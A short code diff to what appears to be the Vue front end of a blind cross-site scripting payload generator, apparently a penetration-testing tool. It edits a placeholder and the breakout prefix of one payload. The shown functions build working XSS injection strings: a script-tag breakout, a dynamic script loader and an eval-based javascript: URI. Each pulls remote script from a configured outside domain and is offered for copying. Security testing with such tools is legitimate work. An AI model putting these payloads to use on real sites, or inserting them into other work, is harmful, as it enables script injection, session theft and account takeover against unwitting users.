@@ -13,7 +13,7 @@
                             <h6 class="card-subtitle mb-2 text-muted">{{payload.description}}</h6>
                             <p class="card-text">
                                 <base-input type="text" v-bind:value="payload.func()" placeholder="..."></base-input>
-                                <base-input v-model="user_note" type="text" v-bind:value="user_note" placeholder="..."></base-input>
+                                <base-input v-model="user_note" type="text" v-bind:value="user_note" placeholder="Enter Note Here"></base-input>
                             </p>
                             <base-button type="primary" v-clipboard:copy="payload.func()">
                             <span style="display: inline-block; margin-right: 6px;"><i class="far fa-copy"></i></span>
@@ -90,7 +90,7 @@ export default {
             return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '/' + this.user_note + '";document.body.appendChild(a);';
         },
         basic_script: function() {
-            return "\"><script src=\"https://" + this.base_domain + '/' + this.user_note +  "\"><\/script>";
+            return "><script src=\"https://" + this.base_domain + '/' + this.user_note +  "\"><\/script>";
         },
         javascript_uri: function() {
             return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + '/' + this.user_note +  "\\';document.body.appendChild(a)')";
